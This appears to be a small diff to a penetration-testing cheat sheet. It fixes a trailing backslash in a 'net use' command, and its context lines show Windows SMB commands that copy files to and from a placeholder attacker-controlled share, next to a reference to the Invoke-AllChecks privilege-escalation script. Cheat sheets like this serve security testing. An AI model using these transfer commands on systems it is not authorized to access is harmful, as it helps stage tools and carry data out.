@@ -1568,7 +1568,7 @@ Invoke-AllChecks
 copy \\{IP ADDRESS}\share\{FILE}
 
 # SMB SHARE DOWNLAOD FILE
-net use z: \\{IP ADDRESS}\share\
+net use z: \\{IP ADDRESS}\share
 copy {FILE} z:
 
 # {IP ADDRESS}: IP Address of the client from step one
